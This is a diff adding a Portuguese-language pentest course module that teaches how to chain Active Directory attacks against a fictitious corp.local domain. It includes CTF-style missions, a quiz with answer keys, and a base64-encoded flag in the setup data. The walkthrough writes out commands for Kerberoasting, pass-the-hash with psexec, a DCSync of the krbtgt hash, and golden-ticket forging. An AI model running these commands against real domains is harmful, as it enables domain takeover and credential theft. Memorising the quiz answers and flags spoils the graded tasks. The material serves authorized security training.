@@ -1,0 +1,620 @@
+---
+slug: mini-projeto-ad
+track: trilha-7
+title: "Mini-projeto: comprometer o domínio"
+prerequisites: [enumeracao-de-dominio, ataques-classicos-ad, movimento-lateral]
+lab: null
+tasks:
+  - slug: missao-1-elo-fraco
+    title: "Missão 1 — achar o elo fraco da cadeia"
+    type: flag
+    prompt: "No m1-enum.json, ache a ÚNICA conta que é ao mesmo tempo (1) Kerberoastável — conta de usuário, com SPN, habilitada — e (2) admin local de um host onde há sessão de uma conta privilegiada. Decodifique a nota (base64) dela: é a flag. Cole no formato FLAG{...}."
+    hint: "São dois testes cruzados, não um. Primeiro filtre as contas roastáveis: sAMAccountType 805306368 (usuário, não 805306369 de computador), com servicePrincipalName preenchido e sem o bit 0x2 (ACCOUNTDISABLE) no userAccountControl. Depois, para cada candidata, veja em local_admin_of de quais hosts ela é admin e cruze com privileged_sessions. A que passa nos dois é o alvo; as notas das outras começam com 'decoy:'."
+    flag:
+      hash: "scrypt$16384$8$1$33e8cfdbeeb2883a0291b9d662ecb135acab07150492dbc2cfe688dfbee325c6"
+      salt: "dea50a42decfdd276ed569870a864ad4"
+  - slug: missao-2-cadeia
+    title: "Missão 2 — executar a cadeia até o krbtgt"
+    type: flag
+    prompt: "Quebre o TGS de svc_backup (m2-tgs.txt) com a wordlist, use o NT hash da senha para abrir o m2-vault.enc, pegue o hash do krbtgt que está dentro e decifre o m2-golden.enc (key usage 2). A flag está no conteúdo do golden ticket. Cole no formato FLAG{...}."
+    hint: "É uma corrente de três elos, cada um destrava o próximo. (1) Kerberoasting: para cada senha da wordlist, calcule o NT hash e tente decifrar a parte cifrada do TGS com key usage 2 — a que fecha o checksum é a senha certa. (2) O vault é RC4 puro cifrado com esse NT hash; decifre e leia o hash do krbtgt lá dentro. (3) O golden ticket é a parte cifrada de um TGT: decifre com o hash do krbtgt e key usage 2 (a do enc-part do ticket, igual ao 7.4)."
+    flag:
+      hash: "scrypt$16384$8$1$436ae3be0aa217c6d2324dbdacf82cce547247cbec49a4985c7804061b59614f"
+      salt: "03372e2c060f8746aa31f28231ee6110"
+  - slug: missao-3-relatorio
+    title: "Missão 3 — documentar o caminho (ordenar + mapear ao ATT&CK)"
+    type: flag
+    prompt: "No m3-report.json, ordene os 8 eventos em ordem cronológica do ataque e mapeie cada um ao ID MITRE ATT&CK correto. Monte o m3-answer.txt (um ID por linha, na ordem) e rode o report.py: se a ordem E o mapeamento estiverem certos, ele decifra a flag. Cole no formato FLAG{...}."
+    hint: "A ordem é a da própria cadeia que você estudou: foothold com credencial válida → enumerar contas/SPNs → mapear trusts → mapear grupos/caminhos → Kerberoasting → movimento lateral por SMB → DCSync → golden ticket. Para o mapeamento, cada técnica tem uma página no attack.mitre.org; cuidado para não trocar T1558.001 (Golden Ticket) por T1558.002 (Silver) nem T1558.003 (Kerberoasting). O report.py só decifra uma flag legível se tudo bater."
+    flag:
+      hash: "scrypt$16384$8$1$aafd455e6b62d4925bf35f4267c612b465ce55bc61abec443b64a9821f755ffa"
+      salt: "dd3949d00dec5be866462b9a82f624cb"
+  - slug: quiz-final
+    title: "Quiz — Mini-projeto: comprometer o domínio"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "A tese que amarra toda a Trilha 7 é que o comprometimento de um domínio é uma cadeia de reutilização de identidade. O que isso quer dizer na prática?"
+        options:
+          - "Que o atacante precisa de um exploit de execução remota (RCE) no controlador de domínio para cada etapa"
+          - "Que o ataque avança reaproveitando segredos de autenticação (hash, ticket) de uma etapa para a próxima — foothold, enumeração, Kerberoasting, movimento lateral, DCSync, golden ticket —, quase sem explorar vulnerabilidades de código"
+          - "Que todo o ataque depende de uma única falha de software que, corrigida, interrompe tudo"
+          - "Que a escalação é um pulo único de um usuário comum direto para Domain Admin"
+        answer: 1
+        explanation: "A espinha dorsal da trilha é identidade, não exploit. Cada etapa produz um segredo (uma senha quebrada, um hash, um ticket) que habilita a seguinte; raramente há um CVE no meio. Não é um RCE por etapa (A), não é uma falha única (C) — por isso a defesa quebra a cadeia em vários pontos — e não é um pulo único (D): é uma sequência de arestas curtas, como no grafo do BloodHound."
+      - question: "Na Missão 1 você cruza duas informações para achar o 'elo fraco'. Por que não basta a conta ser Kerberoastável?"
+        options:
+          - "Porque uma conta roastável só faz avançar a cadeia se, depois de quebrada, levar a algum lugar útil — por exemplo, ser admin local de um host onde há uma sessão privilegiada para roubar; sem esse caminho, a credencial é um beco sem saída"
+          - "Porque contas Kerberoastáveis nunca têm senha fraca"
+          - "Porque o Kerberoasting só funciona em contas de computador"
+          - "Porque é preciso ser Domain Admin para pedir o ticket de serviço"
+        answer: 0
+        explanation: "Kerberoasting é barato e devolve muitas contas; o que importa é quais levam a lugar. Uma conta de serviço com senha fraca mas sem poder (não é admin de nada útil) não avança a escalação. O valor está no cruzamento: roastável E num caminho que chega a uma credencial privilegiada. As iscas são falsas: contas roastáveis podem ter senha fraca ou forte, o Kerberoasting ataca contas de usuário com SPN (não de computador), e qualquer usuário autenticado pode pedir o ticket de serviço."
+      - question: "A Missão 2 encadeia três decifragens: quebrar o TGS, abrir o vault e decifrar o golden ticket. Por que o hash do krbtgt é o que fecha a cadeia?"
+        options:
+          - "Porque o krbtgt é membro de Domain Admins e logar com ele já dá acesso"
+          - "Porque o hash do krbtgt é a senha de todos os usuários ao mesmo tempo"
+          - "Porque a chave derivada da senha do krbtgt cifra e assina TODO ticket-granting ticket do domínio; com esse hash, o atacante forja um TGT válido para qualquer conta e grupos, e o KDC o aceita como legítimo"
+          - "Porque o krbtgt desativa a pré-autenticação de todas as contas"
+        answer: 2
+        explanation: "O krbtgt é a conta de serviço do KDC: sua chave valida todo TGT do domínio. Quem a tem forja um golden ticket dizendo 'sou Domain Admin' e o KDC acredita. Ele não é um usuário que se loga, não é a senha de todo mundo, e pré-autenticação é assunto do AS-REP roasting, não do krbtgt. Por isso a cadeia foothold → ... → krbtgt é o caminho clássico ao controle total."
+      - question: "A Missão 3 pede ordem cronológica E mapeamento ATT&CK. Por que isso é parte essencial de um pentest, e não um detalhe burocrático?"
+        options:
+          - "Porque o cliente paga por página de relatório"
+          - "Porque o valor de um teste está no relatório reproduzível: uma linha do tempo ordenada e cada passo mapeado a uma técnica conhecida permitem ao defensor entender o caminho, reproduzir, priorizar e cortar os elos certos — sem isso, fica só 'fomos invadidos'"
+          - "Porque o mapeamento ATT&CK quebra as senhas automaticamente"
+          - "Porque a ordem cronológica serve só para a capa do relatório"
+        answer: 1
+        explanation: "Um achado sem narrativa reproduzível e sem referência a um framework comum (ATT&CK) é difícil de agir. A timeline mostra causa e efeito; o mapa ATT&CK liga cada passo a detecções e mitigações conhecidas, para o defensor priorizar. É o que separa um pentest de uma anedota — e é o objetivo específico deste módulo, a ponte para a Trilha 8."
+      - question: "A defesa deste módulo é 'em profundidade': quebrar um elo quebra a cadeia. Qual conjunto de medidas ataca elos DIFERENTES da cadeia, em vez de reforçar o mesmo ponto?"
+        options:
+          - "Trocar a senha do Administrador, trocar a senha do krbtgt uma vez e renomear o grupo Domain Admins"
+          - "Bloquear a porta 389 no firewall e desligar o log de auditoria do controlador"
+          - "gMSA nas contas de serviço (corta o Kerberoasting), LAPS (corta a reutilização lateral), monitorar o evento 4662 de replicação vinda de não-DC (detecta o DCSync) e rotação dupla do krbtgt (invalida golden tickets)"
+          - "Exigir que todos os usuários troquem a senha a cada 30 dias"
+        answer: 2
+        explanation: "A opção certa cobre elos distintos: credential access (gMSA), movimento lateral (LAPS), detecção do DCSync (evento 4662) e persistência por golden ticket (rotação dupla do krbtgt). Trocar senhas e renomear o grupo reforça pontos isolados e tem erros (um reset só do krbtgt deixa a chave antiga válida; renomear grupo é security through obscurity). Bloquear a 389 quebra o domínio e desligar auditoria ajuda o atacante; e troca periódica de senha não corta nenhum desses elos."
+glossary:
+  - term: tiering
+    definition: "Administração em camadas: separar contas e máquinas por sensibilidade (Tier 0 = controladores e contas de domínio; Tier 1 = servidores; Tier 2 = estações) e proibir que uma conta de camada alta faça logon numa camada baixa, para que um comprometimento comum não alcance o domínio."
+  - term: PAW
+    definition: "Privileged Access Workstation: estação dedicada e endurecida, usada só para tarefas administrativas sensíveis, de onde as credenciais privilegiadas nunca tocam uma máquina comum onde seriam roubadas."
+  - term: Protected Users
+    definition: "Grupo do domínio cujos membros ganham proteções extras de autenticação (bloqueio de NTLM, de RC4 e de delegação), dificultando roubar e reutilizar as credenciais dessas contas sensíveis."
+  - term: diamond ticket
+    definition: "Variante furtiva do golden ticket: em vez de forjar um TGT do zero, o atacante pede um TGT legítimo ao KDC e só modifica o PAC dele (decifrando e recifrando com a chave do krbtgt), produzindo um ticket quase idêntico aos reais."
+  - term: SID history
+    definition: "Atributo que guarda SIDs antigos de uma conta migrada entre domínios; abusado para injetar o SID de um grupo privilegiado (como Domain Admins) e carregar esse poder de um domínio para outro numa floresta."
+  - term: assume breach
+    definition: "Postura de defesa que parte do princípio de que o atacante já está dentro da rede, investindo em conter movimento lateral e escalação, não só em barrar o perímetro."
+---
+
+import oMapaDoComprometimento from "./img/o-mapa-do-comprometimento.svg";
+import aCadeiaESeusCortes from "./img/a-cadeia-e-seus-cortes.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Nos três módulos anteriores você ganhou peças soltas. No 7.2, aprendeu a **enxergar** o domínio a partir de uma conta comum. No 7.3, a arrancar credenciais com <GlossaryTerm term="Kerberoasting">Kerberoasting</GlossaryTerm> e AS-REP roasting. No 7.4, a **reutilizar** credenciais para andar de máquina em máquina e a forjar o <GlossaryTerm term="golden ticket">golden ticket</GlossaryTerm> que entrega o domínio. Cada módulo terminou com um troféu pequeno. Este módulo é onde as peças viram uma campanha: você vai **encadear** enumeração, ataque e escalação numa única linha que vai de "um usuário qualquer" até "dono do domínio" — e, o que nenhum módulo anterior cobriu, vai **documentar esse caminho** como um pentester de verdade faz.
+
+Esse último ponto não é enfeite. O que um cliente compra num teste de intrusão não é a invasão: é o **relatório** que mostra, de forma reproduzível, como a rede caiu, em que ordem, e onde cortar. Um comprometimento sem documentação é uma anedota ("a gente entrou"); um comprometimento documentado é um mapa que o defensor usa para fechar os buracos. Por isso o mini-projeto termina não numa shell de Domain Admin, mas numa **linha do tempo** com cada passo mapeado ao <GlossaryTerm term="MITRE ATT&CK">MITRE ATT&CK</GlossaryTerm>.
+
+Praticamente todo ataque sério a uma rede Windows corporativa percorre exatamente a cadeia que você vai montar aqui: um grupo de ransomware não "hackeia o Active Directory" com um exploit mágico — ele entra com uma credencial, olha o mapa, pega uma conta de serviço fraca, se move de lado, replica os segredos do domínio e forja persistência. Ver essa cadeia inteira de uma vez, dos dois lados, é o que fecha a Trilha 7.
+
+**Ao final, você vai saber:**
+
+- encadear, numa só narrativa, as técnicas de 7.2, 7.3 e 7.4: foothold → enumeração → Kerberoasting → <GlossaryTerm term="lateral movement">movimento lateral</GlossaryTerm> → <GlossaryTerm term="DCSync">DCSync</GlossaryTerm> → golden ticket;
+- identificar o **elo fraco** de uma rede cruzando dados de enumeração (quem é roastável × quem leva a um caminho privilegiado), em vez de atacar às cegas;
+- executar uma cadeia de decifragem offline (quebrar um ticket → abrir um cofre de credenciais → forjar o golden ticket) que reproduz a matemática real do Kerberos;
+- **documentar** uma invasão: montar a linha do tempo e mapear cada passo ao MITRE ATT&CK, do jeito que entra num relatório;
+- defender o domínio **em profundidade**: entender por que quebrar um único elo da cadeia já derruba a campanha inteira.
+
+**Pré-requisitos:**
+
+- **7.2 — Enumeração de domínio:** você vai reusar o cruzamento de atributos (<GlossaryTerm term="servicePrincipalName (SPN)">SPN</GlossaryTerm>, <GlossaryTerm term="userAccountControl">userAccountControl</GlossaryTerm>) e a leitura de grafo do <GlossaryTerm term="BloodHound">BloodHound</GlossaryTerm>.
+- **7.3 — Ataques clássicos:** o Kerberoasting e o cracker em Python puro (<GlossaryTerm term="RC4-HMAC (etype 23)">RC4-HMAC etype 23</GlossaryTerm>, key usage 2) que você vai estender.
+- **7.4 — Movimento lateral e escalação:** o golden ticket, o <GlossaryTerm term="krbtgt">krbtgt</GlossaryTerm>, o DCSync e o <GlossaryTerm term="pass-the-hash">pass-the-hash</GlossaryTerm>.
+
+**Tempo estimado:** 3 a 4 horas, incluindo as três missões e a redação da linha do tempo.
+
+<Callout variant="ethics">
+Encadear enumeração, roubo e forja de credenciais contra um domínio só é legítimo no laboratório ou num engajamento com autorização por escrito que inclua o domínio no escopo (Trilha 1; no Brasil, acesso não autorizado a sistema informático é crime, Lei 12.737/2012). Este módulo **não tem lab próprio**: a Trilha 7 é teoria + walkthrough guiado, e as missões são de **análise, decifragem e documentação de artefatos fictícios que você mesmo gera no seu WSL**. Nenhum domínio real é tocado, e a mesma disciplina de escopo e documentação que você treina aqui é o que mantém um pentest dentro da lei.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O comprometimento de um domínio é uma cadeia, não um golpe
+
+O iniciante imagina que "invadir o Active Directory" (o serviço de diretório da Microsoft que centraliza contas e permissões de quase toda rede corporativa Windows, visto no 7.1) é achar *a* falha — um exploit no controlador de domínio que, uma vez disparado, entrega tudo. Quase nunca é assim. Na imensa maioria dos casos reais, não há exploit nenhum no caminho crítico. Há uma **sequência de reutilizações de identidade**: cada etapa produz um segredo de autenticação — uma senha quebrada, um NT hash, um ticket Kerberos — que serve de chave para a etapa seguinte.
+
+É essa a <GlossaryTerm term="kill chain">kill chain</GlossaryTerm> (a cadeia de etapas de um ataque, da Trilha 1) específica do domínio, e ela tem uma forma reconhecível:
+
+1. **Foothold** — uma credencial de usuário comum (phishing, senha reutilizada, uma conta de serviço exposta). Não dá poder; dá presença.
+2. **Enumeração** — com essa conta, lê-se o mapa: contas, grupos, SPNs, sessões, permissões, caminhos (7.2).
+3. **Credential access** — arranca-se uma credencial melhor: Kerberoasting de uma conta de serviço com senha fraca, AS-REP roasting (7.3).
+4. **Movimento lateral** — reutiliza-se essa credencial para executar em outras máquinas (7.4).
+5. **Escalação** — em algum host, captura-se uma credencial privilegiada; com direito de replicação, roda-se o DCSync e pega-se o hash do krbtgt (7.4).
+6. **Dominação e persistência** — com o krbtgt, forja-se o golden ticket: Domain Admin, e persistência que sobrevive à troca de senhas (7.4).
+
+<Figure
+  src={oMapaDoComprometimento}
+  alt="Fluxo em seis estágios da esquerda para a direita, cada caixa marcada com o módulo da Trilha 7 de origem e o ID MITRE ATT&CK. 1 foothold: j.silva, usuário comum, módulo 7.2, T1078. 2 enumerar: LDAP e BloodHound acham svc_backup, módulo 7.2, T1087.002 e T1069.002. 3 roast: pede o TGS e quebra a senha fraca, módulo 7.3, T1558.003. 4 lateral: SMB e PsExec reutilizam a credencial, módulo 7.4, T1021.002 e T1550. 5 DCSync: replica o controlador e pega o krbtgt, módulo 7.4, T1003.006. 6 golden: forja o TGT e vira Domain Admin, módulo 7.4, T1558.001. Uma faixa embaixo diz que a peça do 7.5 é documentar o caminho: cada seta é uma reutilização de identidade e cada etapa vira uma linha do relatório, ordenada e mapeada ao ATT&CK."
+  caption="A campanha inteira num quadro: cada caixa vem de um módulo anterior; o 7.5 encadeia tudo e acrescenta a documentação. É o mapa que você vai percorrer."
+/>
+
+A consequência prática dessa visão é enorme para os dois lados. Para o atacante: não adianta ter a técnica isolada; o que vale é **ligar os elos** — saber qual conta roastar porque ela leva a um lugar, não porque é roastável. Para o defensor: como é uma cadeia, **não existe um único botão** que impede tudo — mas, em compensação, quebrar *qualquer* elo quebra a campanha. Essa simetria é o fio da seção 8.
+
+### 2.2 Enumeração, ataque e escalação são o mesmo grafo
+
+Uma ideia que só fica clara quando você vê a cadeia inteira: os três módulos anteriores não são três assuntos, são **três leituras do mesmo grafo de relações** do domínio. O BloodHound (7.2) representa o Active Directory como nós (usuários, grupos, computadores) e arestas (MemberOf, AdminTo, HasSession, GenericAll). O Kerberoasting (7.3) é uma aresta especial: "esta conta de usuário tem SPN, logo seu ticket é quebrável". O movimento lateral (7.4) percorre as arestas AdminTo e HasSession. A escalação é o <GlossaryTerm term="attack path">attack path</GlossaryTerm> (o caminho de ataque) — a sequência de arestas mais curta de onde você está até Domain Admins.
+
+Por isso a Missão 1 deste módulo é um **cruzamento**: achar a conta que é roastável *e* fica numa aresta que leva a uma sessão privilegiada. Enumerar sem cruzar devolve ruído; cruzar transforma a lista num alvo.
+
+### 2.3 Por que a documentação é parte do ataque, não um apêndice
+
+Um pentest profissional é regido por uma metodologia (o <GlossaryTerm term="PTES">PTES</GlossaryTerm> e o WSTG, da Trilha 1), e a metodologia não termina na exploração: ela termina no **relatório**. Há três razões técnicas, não burocráticas, para isso:
+
+- **Reprodutibilidade.** Um achado que o cliente não consegue reproduzir não será corrigido. A linha do tempo ordenada — "às 14:02 pedi o TGS de `svc_backup`; às 14:09 a senha quebrou; às 14:15 me movi para `WS-FS`" — é o que permite repetir e confirmar.
+- **Priorização.** Mapear cada passo ao MITRE ATT&CK liga seu ataque a um catálogo público de **detecções e mitigações**. Quando você escreve "DCSync — T1003.006", o defensor já sabe qual evento monitorar (4662) e o que mitigar. Sem o mapa, cada achado é uma ilha.
+- **Cadeia de custódia.** As evidências (saídas, hashes, horários em UTC) precisam ser íntegras e rastreáveis, como você viu em 1.5. Um comprometimento mal documentado é um comprometimento que não aconteceu, do ponto de vista do cliente.
+
+É por isso que a Missão 3 é tão central quanto as duas de ataque: ela treina a entrega. A postura espelhada no defensor — **assumir que o atacante já está dentro e investir em conter a cadeia** — tem até nome, <GlossaryTerm term="assume breach">assume breach</GlossaryTerm>, e é a filosofia que fecha o módulo.
+
+## 3. Na prática da segurança — a campanha de ponta a ponta
+
+Como este é um mini-projeto de síntese (sem um ataque novo), esta seção mostra a cadeia **inteira** rodando, do ponto de vista de um Kali contra o domínio fictício `corp.local` (controlador `dc01.corp.local` em `192.168.56.10`), com a credencial inicial de `j.silva`. Você não tem um domínio para rodar isto agora — a seção 5 treina a análise e a decifragem offline. Aqui a sessão é demonstrada para você reconhecer cada passo **e já vê-lo com o rótulo ATT&CK que vai para o relatório**. (As ferramentas são as do Kali; IPs e nomes são genéricos.)
+
+### 3.1 Foothold e enumeração (T1078 → T1087.002, T1069.002, T1482)
+
+Com a credencial de `j.silva` (a conta válida — [T1078](https://attack.mitre.org/techniques/T1078/)), o primeiro movimento é ler o domínio. O `ldapsearch` lista contas e SPNs (Account Discovery: Domain Account, [T1087.002](https://attack.mitre.org/techniques/T1087/002/)); o `bloodhound-python` coleta o grafo de grupos e sessões (Permission Groups Discovery, [T1069.002](https://attack.mitre.org/techniques/T1069/002/)); e os trusts entram como <GlossaryTerm term="domain trust">domain trust</GlossaryTerm> ([T1482](https://attack.mitre.org/techniques/T1482/)):
+
+```console
+$ ldapsearch -x -H ldap://192.168.56.10 -D 'j.silva@corp.local' -w '***' \
+    -b 'dc=corp,dc=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
+# svc_backup  servicePrincipalName: cifs/fs01.corp.local
+# svc_web     servicePrincipalName: http/web01.corp.local
+# ...
+$ bloodhound-python -u j.silva -p '***' -d corp.local -ns 192.168.56.10 -c All
+INFO: Found 42 users, 15 groups, 7 computers
+INFO: Compressing output into 20240518_bloodhound.zip
+```
+
+No BloodHound, o caminho curto aparece: `svc_backup` é admin local de `WS-FS`, e em `WS-FS` há uma sessão de `h.santos`, que é de `Server-Admins`. O elo fraco não é "a conta mais fácil de roastar" — é a que **leva a algum lugar**.
+
+### 3.2 Kerberoasting do elo fraco (T1558.003)
+
+Pede-se o ticket de serviço de `svc_backup` e quebra-se offline ([T1558.003](https://attack.mitre.org/techniques/T1558/003/)):
+
+```console
+$ impacket-GetUserSPNs corp.local/j.silva:'***' -dc-ip 192.168.56.10 -request-user svc_backup
+$krb5tgs$23$*svc_backup$CORP.LOCAL$cifs/fs01.corp.local*$a45c5831...<recortado>
+$ hashcat -m 13100 svc_backup.tgs /usr/share/wordlists/rockyou.txt
+...a45c5831...:Autumn2023!
+```
+
+A senha fraca `Autumn2023!` cai. Agora `svc_backup` é sua — e você sabe, da enumeração, que ela abre `WS-FS`.
+
+### 3.3 Movimento lateral e DCSync (T1021.002, T1550 → T1003.006)
+
+Reutiliza-se a credencial para executar em `WS-FS` por SMB/<GlossaryTerm term="PsExec">PsExec</GlossaryTerm> ([T1021.002](https://attack.mitre.org/techniques/T1021/002/)); lá, captura-se a credencial de `h.santos`, que tem direito de replicação. Com ela, o <GlossaryTerm term="DCSync">DCSync</GlossaryTerm> pede o hash do krbtgt sem pisar no controlador ([T1003.006](https://attack.mitre.org/techniques/T1003/006/)):
+
+```console
+$ impacket-psexec -hashes :805bd85ee21a69fdbea7f24e14b8e11e corp.local/svc_backup@192.168.56.30
+C:\> whoami
+corp\svc_backup
+$ impacket-secretsdump -just-dc-user krbtgt corp.local/h.santos@192.168.56.10 -hashes :<hash>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b4f3e2a9c7d61508e2f94a3b7c6d5e01:::
+```
+
+### 3.4 Golden ticket (T1558.001)
+
+Com o hash do krbtgt (`b4f3e2a9...`), forja-se o golden ticket ([T1558.001](https://attack.mitre.org/techniques/T1558/001/)) — Domain Admin, persistente:
+
+```console
+$ impacket-ticketer -nthash b4f3e2a9c7d61508e2f94a3b7c6d5e01 \
+    -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local Administrator
+[*] Saving ticket in Administrator.ccache
+```
+
+Seis comandos, seis rótulos ATT&CK, uma cadeia. É essa narrativa — ordenada e mapeada — que a Missão 3 vai te fazer reconstruir.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Akira ransomware — a cadeia exata, num alerta oficial (2024–2025)
+
+Em **18 de abril de 2024**, FBI, CISA, o Cyber Crime Center do Departamento de Defesa (DC3), o Departamento de Saúde (HHS), a Europol (EC3) e parceiros europeus (França, Alemanha e o NCSC-NL dos Países Baixos) publicaram o alerta conjunto **#StopRansomware: Akira Ransomware (AA24-109A)**, atualizado pela última vez em **13 de novembro de 2025**. O alerta descreve, com as próprias palavras, a cadeia deste módulo.
+
+Sobre o passo de credential access, o alerta diz: *"Akira threat actors leverage post-exploitation techniques, such as Kerberoasting, to extract credentials stored in the process memory of the Local Security Authority Subsystem Service (LSASS)."* Ou seja, **Kerberoasting** (o 7.3, o estágio 3 do nosso mapa) aparece nominalmente. Para dumping de credenciais e escalação, o alerta observa: *"Akira threat actors also use credential scraping tools, like Mimikatz and LaZagne, to aid in privilege escalation."* — o <GlossaryTerm term="Mimikatz">Mimikatz</GlossaryTerm> que você viu no 7.3/7.4. Para a enumeração do domínio: *"`net` Windows commands are used to identify domain controllers and gather information on domain trust relationships."* — exatamente o Domain Trust Discovery (T1482) e o Account Discovery (T1087.002) da seção 3.1. E, para chegar aos segredos do domínio, o grupo *"bypass Virtual Machine Disk (VMDK) file protection by temporarily powering down the domain controller's VM, copying the VMDK files, and attaching them to a newly created VM"*, o que lhes permitiu *"extract the `NTDS.dit` file and the SYSTEM hive"* — a base de contas inteira do domínio (uma alternativa "física" ao DCSync para o mesmo objetivo: os hashes de todas as contas, inclusive o krbtgt).
+
+- **Impacto:** segundo o alerta, *"as of late September 2025, Akira ransomware has claimed approximately $244.17 million (USD) in ransomware proceeds."* Ativo desde **março de 2023**, o grupo *"impacted a wide range of businesses and critical infrastructure entities in North America, Europe, and Australia"*, com preferência por instituições de ensino e pelos setores de manufatura crítica, TI, saúde, finanças e alimentos.
+- **Lição:** o que derruba uma rede corporativa inteira não é um exploit exótico — é a cadeia **enumeração → Kerberoasting → dumping de credenciais → segredos do domínio** que você está montando. Como ela é uma sequência de reutilização de identidade, a defesa (gMSA, segmentação, monitorar replicação, rotação do krbtgt) corta os mesmos elos que o pentester percorre. É o argumento da seção 8, confirmado por um incidente de escala nacional.
+- **Fonte:** [CISA — #StopRansomware: Akira Ransomware, AA24-109A (18 abr. 2024, atualizado 13 nov. 2025)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a).
+
+## 5. Mãos à obra — o mini-projeto: da enumeração ao relatório
+
+Este módulo **não tem lab próprio** (a Trilha 7 fica enxuta, sem subir um domínio inteiro nos seus 16 GB). O mini-projeto roda 100% offline, no seu WSL, contra artefatos sanitizados de `corp.local` — e exige o que nenhuma missão anterior exigiu: **encadear** as três fases e **documentar** o caminho.
+
+**Objetivo:** ao terminar, você terá (1) achado o **elo fraco** da rede cruzando a enumeração; (2) executado a **cadeia de decifragem** — quebrar o ticket, abrir o cofre, forjar o golden ticket — até ler a identidade de Domain Admin; e (3) reconstruído e **documentado** a campanha, ordenando a linha do tempo e mapeando cada passo ao MITRE ATT&CK. Três flags, uma por missão.
+
+<Callout variant="info" title="Por que offline, com artefatos forjados?">
+Contra um domínio real você usaria `ldapsearch`, `impacket-GetUserSPNs`, `hashcat`, `impacket-secretsdump` e `impacket-ticketer` (seção 3). Aqui, para rodar sem um domínio e **ver a matemática**, os artefatos foram forjados: o ticket de serviço e o golden ticket guardam a mesma criptografia RC4-HMAC (etype 23) do 7.3/7.4 (o `MD4` + RC4 + HMAC-MD5), e o "cofre de credenciais" (`vault`) é o loot que você teria capturado após o movimento lateral. A lição é idêntica; só a escala muda.
+</Callout>
+
+### 5.1 Preparar o terreno (passo a passo)
+
+Abra o terminal do Ubuntu (WSL) e cole o bloco inteiro. Ele cria, em `/tmp/ad-miniprojeto`, os artefatos das três missões:
+
+```bash
+ROOT=/tmp/ad-miniprojeto
+rm -rf "$ROOT"; mkdir -p "$ROOT"; cd "$ROOT"
+
+# Missao 1: dump de enumeracao. Cruze contas (SPN/userAccountControl/tipo) com os
+# fatos de admin local e sessoes privilegiadas para achar o elo fraco.
+cat > m1-enum.json <<'DOC'
+{
+  "accounts": [
+    { "sam": "svc_backup", "type": 805306368, "spn": "cifs/fs01.corp.local", "uac": "0x10200",
+      "note": "RkxBR3t3ZWFrLWxpbmstaXMtdGhlLWtlcmJlcm9hc3RhYmxlLXN2Yy1hY2NvdW50LW9uLXRoZS1wcml2aWxlZ2VkLWFkbWluLXBhdGh9" },
+    { "sam": "svc_web", "type": 805306368, "spn": "http/web01.corp.local", "uac": "0x10200",
+      "note": "ZGVjb3k6IHN2Y193ZWIgZSBrZXJiZXJvYXN0YWJsZSAodXNlcitTUE4sIGhhYmlsaXRhZGEpLCBtYXMgbmFvIGUgYWRtaW4gbG9jYWwgZGUgbmVuaHVtIGhvc3QgY29tIHNlc3NhbyBwcml2aWxlZ2lhZGE6IGJlY28gc2VtIHNhaWRhIHBhcmEgYSBlc2NhbGFjYW8=" },
+    { "sam": "svc_old", "type": 805306368, "spn": "MSSQLSvc/sql01.corp.local:1433", "uac": "0x10202",
+      "note": "ZGVjb3k6IHN2Y19vbGQgdGVtIFNQTiBtYXMgbyBiaXQgMHgyIChBQ0NPVU5URElTQUJMRSkgZXN0YSBsaWdhZG86IGNvbnRhIGRlc2FiaWxpdGFkYSBuYW8gYXV0ZW50aWNhLCBuYW8gZGEgcGFyYSByb2FzdGFy" },
+    { "sam": "WS-FS$", "type": 805306369, "spn": "cifs/fs01.corp.local", "uac": "0x1000",
+      "note": "ZGVjb3k6IGNvbnRhIGRlIENPTVBVVEFET1IgKHNBTUFjY291bnRUeXBlIDgwNTMwNjM2OSk7IGEgc2VuaGEgZGUgbWFxdWluYSB0ZW0gMTIwKyBjaGFycyBhbGVhdG9yaW9zLCBuYW8gZSByb2FzdGF2ZWwgbmEgcHJhdGljYQ==" },
+    { "sam": "j.silva", "type": 805306368, "spn": "", "uac": "0x200",
+      "note": "ZGVjb3k6IGouc2lsdmEgZSBhIGNvbnRhIHF1ZSB2b2NlIGNvbnRyb2xhLCBtYXMgbmFvIHRlbSBTUE46IG5hbyBoYSB0aWNrZXQgZGUgc2VydmljbyBwYXJhIHJvYXN0YXI=" }
+  ],
+  "facts": {
+    "local_admin_of": { "svc_backup": ["WS-FS"], "svc_web": ["WEB01"], "svc_old": ["SQL01"] },
+    "privileged_sessions": { "WS-FS": "h.santos (Server-Admins)", "DC01": "Administrator (Domain Admins)" }
+  }
+}
+DOC
+
+# Missao 2a: ticket de servico de svc_backup (RC4-HMAC etype 23, key usage 2).
+cat > m2-tgs.txt <<'DOC'
+spn = cifs/fs01.corp.local
+cipher = a45c583134020edce43ab3fecb9643c711191a9465e36b14f98104c7859199a1d610c364f1e6e678997de7d7b74207d6b288c7ec767492698bf02cfc9525e35a29a3305fa52289c6f3e5e2047a8b5b3e2fc4084c3129e5
+DOC
+
+# Missao 2b: wordlist (a senha certa esta entre as iscas).
+cat > m2-wordlist.txt <<'DOC'
+Password1
+Welcome1
+Summer2023!
+Autumn2023!
+Winter2024!
+Company123
+P@ssw0rd
+Backup2022
+Spring2023!
+letmein
+Qwerty123!
+Changeme1
+DOC
+
+# Missao 2c: cofre de credenciais (RC4 puro, chave = NT hash da conta quebrada).
+cat > m2-vault.enc <<'DOC'
+0cfb9963dd5103be01152193e2c314c3eb1485dae43af4ed0dd4318292c8d9e3397af86c90bae8350471a667104359668c018b16820ebfcc1709d391a8ca3a63840aa957110fbd23a26470e779646e92bce16725250f7d18489d6953552245a8912ab0757826c65b364363fbfd6e3bcaeaec9e960a99706754106dc2b65c34d116ac1f6a220e62d909b5c4bcf3523395074446ef63234fac46103abc0b4ff74be7acdd0dff8f95b72e0d78a1082fcec8ee55285898135fd212e7dab7dfc302b7c7f1a3c3ee
+DOC
+
+# Missao 2d: golden ticket forjado (enc-part do TGT), key = hash do krbtgt, usage 2.
+cat > m2-golden.enc <<'DOC'
